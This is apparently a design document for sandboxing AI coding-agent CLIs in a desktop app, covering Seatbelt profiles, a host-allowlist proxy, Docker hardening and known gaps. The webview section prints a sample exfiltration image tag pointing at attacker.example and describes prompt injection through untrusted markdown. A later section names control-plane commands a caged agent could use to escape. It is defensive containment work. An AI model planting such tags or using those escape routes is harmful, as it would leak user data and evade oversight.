# Sandbox

`src-tauri/src/sandbox.rs` + `TaskSandboxDialog`. Per-task macOS sandbox-exec (Seatbelt) + per-task in-process HTTPS CONNECT proxy (`src-tauri/src/proxy.rs`).

## Scope

ONLY the agent CLI's PTY is sandboxed. AuxTerminal, setup script, run script, and archive script run unsandboxed by design — they're user-authored shell needing full reach. The carve-out is enforced by not passing `task_id` in `pty_spawn` / routing scripts through `run_script` which never calls `sandbox::provision`.

## Modes (`SandboxMode`)

Four states, set per-task at create + editable later. `Enforce` is the full cage and is intentionally never weakened.

- **Off** — no cage.
- **Monitor** — allow everything, LOG every file op + network request.
- **Enforce** — full cage: seatbelt FS allow-list **and** network pinned to the loopback proxy.
- **EnforceFs** (serialized `"enforce-fs"`, UI "ENFORCING (FS)") — the **filesystem cage only**. Identical FS allow-list to `Enforce`, but the network sandbox is OFF: `render_profile` emits `(allow network*)` and `provision` starts **no proxy** (so `wrap_command` injects no `http_proxy`). For users who want write/read isolation but unrestricted egress (their own egress controls, VPN, non-HTTP traffic). UI consequence: every network surface is hidden in this mode (host allow-list field in both dialogs, "Blocked hosts" section + "+ domains" copy in the footer activity popover) — only FS rows show. YOLO auto-on (the FS seatbelt is still the real boundary), accent-colored shield.

## Layered model

1. `sandbox-exec -f <profile.sb>` — kernel seatbelt. Profile rendered to `$TMPDIR/termic-sandbox-<wsId>.sb`. Allows broad `file-read*`, narrow `file-write*` on task + agent dirs + caches. Secrets (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.netrc`, `~/.docker/config.json`, `~/.kube`, `~/.config/gh/hosts.yml`, Keychains) ALWAYS denied. `(deny network*)` except loopback to the proxy — UNLESS `EnforceFs`, which emits `(allow network*)` instead.
2. Per-task **in-process CONNECT proxy** on an OS-assigned port (Rust thread inside Tauri binary). Regex hostname allowlist per CLI: claude→anthropic, gemini→google, codex→openai + baseline (github, npmjs, pypi, crates.io, CA OCSP) + task extras. Non-matching → HTTP 403. Stopped via `SandboxBundle::Drop` on PTY teardown. **Not started in `EnforceFs`** (no network sandbox).

## Key behaviors

- **Pinning**: `Task.sandbox_enabled` captured at create time. Edit later via `task_set_sandbox`, which persists AND SIGKILLs every live PTY (otherwise the running process holds the old profile). `TaskSandboxDialog` warns before save.
- **YOLO interaction**: when `ws.sandbox_enabled`, spawn args always include `yolo_args` regardless of global YOLO toggle — the seatbelt is the real boundary. Toolbar `Zap`: OFF→gray, ON+sandboxed→green, ON+unsandboxed→red+pulsing+warning tooltip. Code in `UnifiedBar.tsx`.
- **Default sets** baked into Rust (`builtin_rw_paths`/`builtin_deny_paths`, per-CLI `render_filter` in `sandbox.rs`). Project `sandbox_*` fields are extras only, seeded at task creation.
- **Recent denies**: `task_recent_denials(id, minutes?)` shells to `log show` filtered to task path + "deny". Surfaced in sandbox dialog under lazy `<details>`.

## Docker sandbox (alternate mode, experimental)

`src-tauri/src/docker.rs` + Settings → Docker Sandbox (`DockerSection.tsx`) + `SandboxPicker.tsx` (`NewTaskDialog.tsx`, `TaskSandboxDialog.tsx`, and Settings → Sandbox, see "Unified picker" below). A mutually-exclusive alternative to Seatbelt: the agent CLI runs inside `docker run` instead, and can only touch what termic bind-mounts. See `docs/plans/docker-sandbox/` for the full design + research.

- **Unified picker**: `SandboxPicker.tsx` renders FIVE peer cards - Off, Seatbelt's Enforcing (FS) / Monitoring / Enforcing, and Docker Container (its own full-width row, since it's a different cage MECHANISM, not another intensity level of Seatbelt's) - shared by `NewTaskDialog` (task creation), `TaskSandboxDialog` (editing an existing task), and Settings → Sandbox (the app-wide default, see below). This replaced an earlier two-tier design (an engine row, then a conditional Seatbelt submode grid underneath) once real usage showed Docker being reachable only from a second-level control read as an afterthought rather than a peer choice. `SandboxSelection` (`lib/types.ts`: `SandboxMode | "docker"`) is the flat type; `selectionFor(mode, dockerEnabled)` / `selectionToFields(selection)` convert to/from the SAME two independent backend fields (`sandbox_mode`, `docker_sandbox_enabled`) - still no new data model, just one picker instead of two, and `Docker` never gets a `monitor` submode of its own (there's nothing at the container level equivalent to Seatbelt's proxy/FS-op watcher to log). In `TaskSandboxDialog` the two engines keep their pre-existing, independent commit paths: Docker still commits IMMEDIATELY through its own confirm (`toggleDocker`/`task_set_docker`, always SIGKILLs), while Seatbelt stays a draft the Save button commits (`taskSetSandbox`/`task_set_sandbox`, restart-or-not choice) - `choose()` just decides which of the two a click should drive, rather than merging them into one commit; a Seatbelt card click there IS the final mode now (no separate submode step). Picking "Docker Container" always shows the `<u>network is unrestricted for now</u>` note (`DockerEngineNote`, same copy as Settings → Docker Sandbox) and, in the edit dialog, the "Preview command" toggle.
- **App-wide default**: Settings → Sandbox's "Sandbox new tasks by default" is the SAME `SandboxPicker`, backed by `usePrefs().globalDefaultSandboxKind` (a `SandboxSelection`, localStorage-only - never Rust-persisted). Used by `NewTaskDialog` as the last fallback when seeding a new task's selection: last-used habit (`newTaskLastSandboxMode`, now also tracks `"docker"`) → the project's own `default_sandbox_mode`/`default_sandbox` (still Seatbelt-only - a project can't default new tasks to Docker yet) → this app-wide pick. Migrated automatically from the old boolean `globalDefaultSandbox` pref the first time it's read (`true` → `"enforce"`, `false` → `"off"`) - the new key wins once it exists, so the migration runs at most once per browser profile.
- **Docker's own status icon**: `DockerSandboxIcon` (`SandboxIcon.tsx`, next to `SANDBOX_VISUALS`/`SandboxIcon`) is a `Container` glyph colored `DOCKER_SANDBOX_COLOR` (`var(--color-ok)`) - the same green Seatbelt's `enforce`/`enforce-fs` use, since Docker mode IS a real filesystem cage too, just via a different mechanism. (An earlier version used the warning red `--color-err` on the mistaken assumption it was already established for Seatbelt; that red is YOLO's "on but the cage isn't actually enforced" warning color and is unrelated to any sandbox mode's own identity.) Because Docker mode always stores `sandbox_mode` as `off` (mutually exclusive with Seatbelt), every surface that used to key off `effectiveSandboxMode(task) !== "off"` to decide whether to show a sandbox badge had to add an explicit `task.docker_sandbox_enabled` check FIRST - otherwise a Docker-sandboxed task showed no badge at all, reading as unsandboxed. Wired into the same four places `SandboxIcon` already appeared: the sidebar row badge + its task-menu item (`Sidebar.tsx`), the terminal footer chip (`TerminalPane.tsx`'s `FooterBar`), the top toolbar badge (`UnifiedBar.tsx`), and the command palette's "Sandbox settings" suffix (`CommandPalette.tsx`, text-only there - no icon to swap).
- **Sidebar row badge greys out when idle**: `SandboxIcon`/`DockerSandboxIcon` both take an `active` prop (default `true`, every other caller unaffected) - `false` forces the icon to the same faint gray as OFF regardless of mode, instead of its real color. Only the sidebar row's idle badge (`Sidebar.tsx`, `active={terminalTabs.length > 0}`) passes `false`; it used to show the mode's real color at reduced opacity whether or not the task had ever been launched, which read as "this task is actively caged" even for one sitting untouched. Fill (filled shield for `enforce`, outline for `enforce-fs`/`monitor`) still encodes the mode either way, so the two enforce modes stay distinguishable even gray. The YOLO-danger `Zap` badge in the same row is deliberately NOT included - it's a warning about a dangerous config, not a live status, so it stays red (just dimmer) even when idle.
- **YOLO auto-on covers Docker too**: `isTaskCaged(task)` (`lib/types.ts`) is `isSandboxEnforced(effectiveSandboxMode(task)) || task.docker_sandbox_enabled` - the single check every "is this task actually caged" call site now uses instead of the Seatbelt-only `isSandboxEnforced(effectiveSandboxMode(task))`. Needed because Docker mode always stores `sandbox_mode` as `off`, so the Seatbelt-only check alone can never see a Docker-sandboxed task as caged; before this fix, `--dangerously-skip-permissions` auto-on (`TerminalPane.tsx`'s spawn args and its live-toggle effect) and the sidebar's YOLO menu item (`Sidebar.tsx`) silently treated a Docker-caged task as uncaged. The drag-drop TMPDIR-staging workaround (`TerminalPane.tsx`, `sandboxed: () => isSandboxEnforced(...)`) deliberately still uses the Seatbelt-only check - it has no Docker equivalent.

- **Gating**: two switches AND together. `Settings.docker_sandbox_enabled` is the global master switch (Settings → Docker Sandbox); `Task.docker_sandbox_enabled` is the per-task pin, settable at CREATE time (`CreateTaskArgs`/`CreateMultiArgs`/`task_open_repo`/`task_import_worktree` all take it now) or later via `task_set_docker` (toggled from `TaskSandboxDialog`, mirrors `task_set_sandbox`'s SIGKILL-live-PTYs behavior, and rejects any `docker_extra_args` entry that could widen the cage: `--privileged`, `--cap-add`, `--network`/`--net`, `--pid`, `-v`/`--volume`/`--mount`, `--entrypoint`, `--user`, etc via `docker::validate_extra_args`). Mutually exclusive with Seatbelt at the DATA level, not just at spawn time: every creation path forces `sandbox_mode`/`sandbox_enabled` to off when `docker_sandbox_enabled` is true, so a task's stored fields never claim both cages are pinned on at once (`pty_spawn` also checks Docker FIRST as a second line of defense — when both happen to be on and an image is built, it skips the Seatbelt path entirely). If a task has `docker_sandbox_enabled` but the global switch is off, `pty_spawn` refuses the launch outright rather than silently falling through to an unsandboxed spawn, fail-closed.
- **Image**: one generic image for every agent, built from an editable Dockerfile (`docker_get_dockerfile` / `docker_set_dockerfile`, ships `src-tauri/assets/Dockerfile.default`). Content-addressed tag (`termic-sandbox:{hash}`) so an edit is detected as stale; build is a background action (`docker_build_image`, streams `docker-build://log` / `docker-build://done`) that never runs synchronously on the Rust spawn path (a multi-GB build would freeze the webview on that thread).
- **Rebuild nudge**: `Settings.docker_rebuild_frequency` (`off` / `daily` / `weekly`, default `daily`). Agents in the image are unpinned/always-latest (`Dockerfile.default`'s own header comment), so a cached rebuild is a no-op for freshness - a rebuild always runs `dockerBuildImage(true)` (`--no-cache --pull`, same as the manual "Update agents" button), never a cached build. `maybeRebuildDockerImageForLaunch` (`src/lib/dockerDailyRebuild.ts`) runs from the FRONTEND right before a Docker-mode task's agent spawns (`TerminalPane.tsx`, awaited before `ptySpawn`), and evaluates `isRebuildDue(frequency, lastBuiltDate)` against `docker::DockerImageStatus.last_built_date` (`docker.rs` records the local calendar date alongside the built tag; day-boundary math lives entirely in TS, unit-tested independent of IPC). Rather than silently rebuilding, it PROMPTS (`DockerRebuildPromptDialog`, resolved via `useUI().askDockerRebuild`) with "Rebuild now" / "Skip for now" and an inline frequency picker (`DockerRebuildFrequencyPicker`, shared with Settings → Docker Sandbox) so changing the cadence doesn't need a trip to Settings. "Skip for now" launches immediately on the existing image for someone in a hurry - it isn't sticky, so the next due launch prompts again. "Rebuild now" pushes an info toast, awaits the build, then a success/error toast; a failed rebuild toasts an error and still falls through to spawning with whatever image already exists rather than blocking the launch outright. Concurrent Docker-mode launches single-flight into one prompt/rebuild rather than opening two dialogs or racing two `docker build` calls for the same tag. Rebuilding the image is the ONLY thing that updates an agent CLI: every container runs with `--rm` (`render_argv`), so if an agent's own updater writes a new binary mid-session, that write lands in the container's throwaway layer, not the mounted per-agent config dir - the container is destroyed the moment its terminal closes and the next launch starts fresh from the image, silently reverting to whatever version was baked in at the last rebuild.
- **Mounts**: the worktree, its parent `.git` (worktree pointer resolution), composition members, and a persistent per-agent config dir under `<data_dir>/docker-agents/<agent_id>` (login + sessions + MCP config, shared across every Docker task of that agent, never the host's real `~/.claude` etc). NEVER mounts the whole container HOME (would shadow agent binaries baked in at build time).
- **Hardening**: every container runs with `--cap-drop ALL`, `--security-opt no-new-privileges:true`, and `--pids-limit 512` (rendered unconditionally in `render_argv`, before any task-supplied extra args).
- **Runs as the host user, not root**: `render_argv` adds `--user {host uid}:{host gid}` (`docker::host_uid_gid`, unix-only - `libc::getuid`/`getgid` on the HOST process, since it's the same user that already owns the worktree/agent-config-dir mounts, so ownership matches exactly with no chown needed; falls back to `0:0` on a non-unix build, where Docker mode isn't exercised yet). This exists because Claude Code refuses `--dangerously-skip-permissions` when the process is root - Docker-mode YOLO auto-on (see `isTaskCaged` above) was silently unusable for claude until this landed. `-u`/`--user` is in `UNSAFE_EXTRA_ARG_PREFIXES`, so a task can never override it via `docker_extra_args`. That host uid has no matching `/etc/passwd` entry inside the container, so `HOME=/root` and `USER=agent` are injected explicitly in `build_spec`'s env (every agent's config still lives under `/root`, unchanged - nothing moved to a uid-specific home) and `Dockerfile.default` runs `chmod -R a+rwX /root` at build time so that uid can read/write everything baked in there.
- **Known gap: network is unrestricted**. Seatbelt tasks get a per-task CONNECT-proxy host allowlist (`sandbox_allowed_hosts`); Docker mode never reads that list and `render_argv` emits no `--network` flag, so every Docker-mode container gets the default bridge network with unrestricted outbound access. A compromised agent in Docker mode can reach any host; the equivalent Seatbelt-enforced task cannot. The filesystem cage is real, the network cage is not (yet).
- **Activity monitor**: the host pid tree `procmon.rs` walks cannot see into a container - the pid it finds is the `docker run` client, which sits nearly idle regardless of how busy the agent is, because the real work happens inside the daemon's VM. `PtySlot.docker_container` (the `--name` from `DockerSpec`) lets `procmon_roots` mark which rows are Docker-sandboxed; `docker::merge_stats` (in `docker.rs`, run inside `procmon_start`/`procmon_sample`'s `spawn_blocking`, never on the IPC thread) then overwrites those rows with a single batched `docker stats --no-stream` query covering every live Docker task, and keeps its own cpu_pct history per row since the host-based numbers the platform sampler already baked in are the wrong ones. `ProcRow.is_docker` badges the row in the UI and explains why its `children` breakdown is always empty (the container's real process tree isn't visible from the host either).
- **Cleanup**: `docker::cleanup_task` runs on task archive and on toggling Docker off for a task; `docker::cleanup_all` runs on app quit AND on app startup (a crash or force-quit doesn't stop an attached `docker run` server-side, so a previous session's abandoned containers are reaped as soon as the next launch's `.setup()` runs, before anything in this session could plausibly own one).
- **Agent support**: `agent_config()` in `docker.rs` maps agent id → container config-dir wiring, deriving its mount paths from `agent_dirs::state_dirs()` (`src-tauri/src/agent_dirs.rs`) rather than its own hardcoded table - that module is the single source for "where does this agent's state live", shared with Seatbelt's default `sandbox_allowed_paths` (`default_agents()` in `lib.rs`) so the two don't hand-maintain separate copies that can drift. Docker's set is the CONFIRMED-state subset of what Seatbelt allows: Seatbelt additionally allows macOS-only extras (`Library/Application Support/*`, defensive XDG paths, claude's regex-covered sidecar files) that have no Docker-container equivalent and stay hand-authored in `default_agents()`. grok is deferred in Docker regardless of what `agent_dirs` lists for it (binary + skills + config all live under `~/.grok` with no clean relocation env, see `docs/plans/docker-sandbox/findings.md`) — a grok login done inside a Docker task is lost on the next container run, since no persistent config dir is mounted for it.
- **User-added extra dirs**: `Settings.docker_agent_extra_dirs` (Settings → Docker Sandbox → "Per-agent config dirs", collapsed by default) lets a user append extra dirs to mount alongside `agent_dirs::state_dirs()`'s built-in list - e.g. a custom skills dir or an MCP server's own state dir. `docker::sanitize_extra_dir` rejects anything absolute or containing `..` before it can become a mount target (a raw `/root/{entry}` concatenation would otherwise let a stray `../../etc` resolve outside `/root`). Read + write both go through the normal `docker_agent_dirs` (read: builtin + extra + `is_builtin`/`persist_offerable`/`persist_enabled`, one row per REGISTERED agent, not just the known-safe ones) / `settings_save` (write: patches the map directly, no separate command) path - the built-in list itself is never editable.
- **Custom-agent opt-in**: for anything outside `docker::KNOWN_SAFE_AGENTS` (claude/codex/copilot/agy/opencode) - including every custom agent a user adds - `docker_agent_extra_dirs` mounts NOTHING unless `Settings.docker_agent_persist_enabled` is also true for that agent id. Off by default even for a brand-new agent. This is deliberate: `agent_config()` has no confirmed state dir for an agent it's never seen, and guessing one risks the exact failure `agent_dirs.rs` documents for grok/agy - an empty dir mounted over a path that ALSO holds a binary baked into the image at build time silently shadows it. grok itself is a PERMANENT exception (`docker::persist_offerable` returns `false` for it, and `agent_config` refuses it outright regardless of the opt-in) - its binary lives inside its own `~/.grok` config dir, so no warning text can make that combination safe. The frontend hides the opt-in toggle entirely for grok rather than offering one that can never do anything.
- **Unified allow-list with Seatbelt**: Docker's `build_spec` now takes the SAME live-rendered list Seatbelt's `sandbox::provision` reads (`live_sandbox_lists` in `lib.rs`: global Settings defaults + the task's own pinned `sandbox_rw_paths` + the project's committed `.termic.yaml`, re-read fresh on every spawn) and mounts every plain entry rw at its own resolved absolute path - same convention as the worktree and composition members. Before this, switching a task from Seatbelt to Docker silently dropped every extra allowed directory; now the two engines agree on "what's allowed" and only differ in enforcement mechanism. `regex:`-prefixed entries are Seatbelt-only (no literal path to mount) and are skipped; a path already covered by an implicit mount (the worktree itself, a composition member) is deduped rather than mounted twice.
- **Per-task extra mounts**: `Task.docker_extra_mounts` (`Vec<String>`, `host_path:container_path` entries, Docker's own `-v` shape) is a DEDICATED field, deliberately NOT part of `sandbox_rw_paths`/"Allowed paths" - that list is shared with Seatbelt via `live_sandbox_lists` and has no concept of a container path, so a `host:container` entry there would be ambiguous the moment a Seatbelt task reuses the same global/project default. Unlike the worktree/git-metadata mounts (host path == container path, a git `commondir`-pointer requirement, not a choice), an extra mount's container path is a free user choice with no same-path constraint. The use case is narrow and intentional: persisting something a fresh container otherwise loses on every restart that the built-in per-agent config dir doesn't cover (a custom MCP server's own data dir, say) - not a general bind-mount escape hatch. `docker::sanitize_extra_mount` validates each entry at spawn time (host: `$HOME`/`$WORKSPACE`-expanded via `subst_path`, must resolve to a non-empty absolute path; container: absolute, no `..`, and not under `docker::UNSAFE_MOUNT_TARGET_ROOTS` - `/root` and every system dir an empty mount could shadow or reach into) and silently drops a malformed entry, same as every other sandbox list parser in this file; `docker::validate_extra_mounts` runs the same container-path shape checks at SAVE time (`task_set_docker`) so a malformed entry surfaces as an error to the user instead of silently vanishing. Runs LAST among `build_spec`'s mount steps so it can dedupe against every mount staged above by either host OR container path - a mount whose container path collides with an already-claimed one (the agent config dir, say) is dropped rather than silently shadowing it. Editable post-create via `task_set_docker(id, enabled, extra_args, extra_mounts)` (`TaskSandboxDialog`'s "Extra mounts" field, saved + SIGKILLs like the rest of that command), and settable at creation too: `CreateTaskArgs`/`CreateMultiArgs`/`task_open_repo`/`task_import_worktree` all take an optional `docker_extra_mounts` override (`NewTaskDialog`'s own "Extra mounts" field, shown under the Docker card in every task-creation shape including the main-checkout/import paths) - unset falls back to `Settings.docker_default_extra_mounts` when Docker mode is on, `Vec::new()` otherwise.
- **Default extra mounts**: `Settings.docker_default_extra_mounts` (Settings → Docker Sandbox → "Default extra mounts", same `host_path:container_path` format and `ListField` widget as a task's own field) is the Settings-level companion - unioned into a NEW Docker-sandboxed task's `docker_extra_mounts` at creation time (`NewTaskDialog` seeds its field from this, same convention as `sandbox_default_rw_paths` seeding a project's allow-list), then owned entirely by the task from then on: editing the default later only affects tasks created from now on, and a task can freely edit/remove/add past whatever it was seeded with. Global rather than per-agent, unlike "Per-agent config dirs" above - an extra mount's use case (persisting an MCP server's own data dir, say) isn't tied to which agent is running. Not validated at `settings_save` (same lazy-validation precedent as `docker_agent_extra_dirs`): a malformed entry is silently dropped by `docker::sanitize_extra_mount` wherever it would actually become a mount.
- **Command preview**: `docker_command_preview(task_id, agent_id?)` calls the exact `build_spec`/`render_argv` the real spawn path uses (never a separate approximation, so it can't drift) and returns the argv + annotated `DockerSpec.mounts` (each with its `why`) to the frontend. Shown behind a "Preview command" toggle in `TaskSandboxDialog`'s Docker section. Works even before the image is built (falls back to a `<image not built yet>` placeholder tag) so it stays useful as a "what would this actually do" check while still setting Docker mode up. Not byte-exact for the *command itself* (a real launch also mints/resumes a session id and composes YOLO flags, frontend-side logic this command doesn't have access to) - but the mounts/env/hardening flags, the security-relevant part this exists to show, are identical either way.
- **How Settings → Agents & Terminals relates to Docker mode**: Docker mode is not a separate set of agents - it's an alternative CONTAINER for the same agents configured there. The command + args to run, any resolved CLI flags (YOLO, etc.), and `Agent.env` (the per-agent `KEY=VAL` block, via `SpawnArgs.env` / `envForCli`) all carry over into the container's argv/`-e` flags, appended after the base `TERM`/`COLORTERM`/relocation-env so a per-agent value wins on key collision - same precedence as the unsandboxed/Seatbelt path. What does NOT carry over: `Agent.sandbox_allowed_paths` is Seatbelt-only and is simply unused in Docker mode (fixed mounts, not an allow-list), and the raw inherited HOST environment (API keys sitting in your shell, say) is deliberately NOT passed through - Docker's isolation model relies on the mounted per-agent config dir for credentials/login instead.

## Known gap: the webview is outside the cage

The seatbelt + CONNECT proxy cage the **agent process**. They do not cage the
**webview**, which makes its own network requests as the app itself. Anything
the webview can be made to fetch is egress the proxy allowlist never sees.

There was one such path (#65): `img-src` in `tauri.conf.json` allows any
`https:` origin, so the markdown preview could render remote images.
Previewing

```markdown
![](https://attacker.example/x.png?d=<data>)
```

used to fire a GET to an arbitrary host on render, with no click and no
prompt, even when the task is in `Enforce` and the agent itself cannot reach
that host.

The realistic trigger was never a scheming agent, it's **prompt injection
plus untrusted markdown**. An agent reads a dependency's README, a GitHub
issue, or a fetched page, and that text tells it to write the image tag. The
same applies to markdown the agent never touched: a contributor's fork, a
submodule, a vendored package. Only a GET was ever possible (no script:
`script-src 'self'`, markdown-it runs with `html:false` and blocks
`javascript:`), so the payload was limited to what the markdown's author
could encode in a URL, plus the viewer's IP, user-agent, and timing. GitHub
and VS Code make the same tradeoff for their previews, but not on by default.

Closed in #69: `gateRemoteImages()` in `MarkdownPreview.tsx` intercepts every
`http(s):` `<img>` src before it ever reaches the DOM's `src` attribute,
gated on a default-OFF `loadRemoteImages` pref (Settings → General) or a
per-tab override set from the preview's own "blocked images" banner. The CSP
itself is unchanged, still allows `https:` in `img-src` — this is a renderer
gate, not a CSP tweak, per the note below.

**Before widening the CSP again, remember it is app-wide.** `connect-src` or
`script-src` would be materially worse than `img-src` is.

## Known gap: one uncontained file read (`file_read_external`)

Every other renderer → filesystem read is bounded by a task root
(`safe_task_path` / `safe_task_read_path`, which reject absolute paths and
`..` outright). `file_read_external` is the single exception, added for
GH #240: a cmd+clicked absolute path in terminal output that resolves
OUTSIDE the task has no task-relative form, so it cannot go through the
contained read, and the tab it opens is read-only.

What this adds is an arbitrary file **read** reachable from the webview. It
is accepted, bounded three ways:

- **Read only.** There is deliberately no absolute-path write counterpart.
  `task_file_write` keeps its containment check, and the tab the read feeds
  is `EditorState.readOnly` with its ⌘S path stubbed out. Nothing can be
  mutated outside a task through this.
- **Text only, capped.** The same 2 MB ceiling as the task read, plus a
  UTF-8 requirement, so it is a text channel rather than a way to pull bytes
  out of arbitrary binaries.
- **Nowhere to send it.** The pinned CSP (`connect-src`, see
  `src/lib/cspGuard.test.ts`) means an attacker who could invoke it has no
  egress for the result.

The residual risk is an XSS in our own UI turning into local file
disclosure. That is strictly worse than before this command existed, and is
the reason `connect-src` must not be widened (see the CSP rule in
CLAUDE.md). The bounds above are pinned by `external_read_*` tests in
`src-tauri/src/lib.rs`.

## Known gap: Monitor mode reaches the CLI control plane

The CLI control socket (docs/plans/cli.md) is denied to `Enforce` /
`EnforceFs` agents as the final SBPL rules (socket + data-dir denies). It
is deliberately NOT denied in `Monitor` mode, whose contract is
observe-never-block: a monitored agent renders `(allow default (with
report))`, so if the CLI is enabled it can reach the socket and read the
token, and that access simply shows up in the file-op / activity log. This
is the accepted trade-off of Monitoring being a pure observer; the cage
that actually enforces the boundary is `Enforce`/`EnforceFs`. (Same spirit
as the webview gap above: a documented, accepted exposure, not a leak.)

## Settled: a caged agent gets NO channel to another agent

Recurring proposal, rejected 2026-08-24. The agent-to-agent protocol
(docs/cli-agent-instructions.md) has one side prompt the other when its
work is done, and an `Enforce` / `EnforceFs` agent cannot take part: it
cannot reach the socket or read the token. The task menu's "Copy agent
CLI briefing" prints a line saying so on caged tasks. That line is
correct behaviour, not a TODO.

Do not "fix" it by letting caged agents reach the control plane. The
verbs are a straight escape (`new --sandbox off --yolo` spawns an uncaged
agent; `apply` writes past the FS allow-list; `attach` types into an
uncaged agent), so any proposal has to narrow them, and the narrow ones
do not survive either:

- **Report-back-only `send`.** Bounds the verb, not the payload. "Run
  this for me" is text, and the recipient is uncaged.
- **Reply-only addressing** (may only send to tasks that first sent to
  it). Bounds the audience, not the payload, and picks the *worst*
  audience: the one correspondent it is guaranteed to have is an agent
  already collaborating with it, so the most likely to comply. This
  makes the deputy more confused, not less.

A cage with a text channel to something uncaged is not a cage. The
supported way for a caged agent to report is the one the briefing
prints: have it write a file inside its own worktree and read that from
outside. If you need the prompt-back protocol, run the task in `Monitor`
(which reaches the CLI by contract, see the gap above) or uncaged.

## Do NOT

- Sandbox AuxTerminal, setup, run, or archive scripts.
- Expose `task_set_sandbox` without SIGKILLing live PTYs by default. `kill_live=false` is an explicit escape hatch with a warning — don't make it the default.
- Widen `tauri.conf.json`'s CSP without reading "Known gap" above. It applies to the whole webview, not to the component you are working on.
- Give caged agents any path to another agent (control plane, scoped token, notify side channel). See "Settled" above for why the narrow versions fail too.
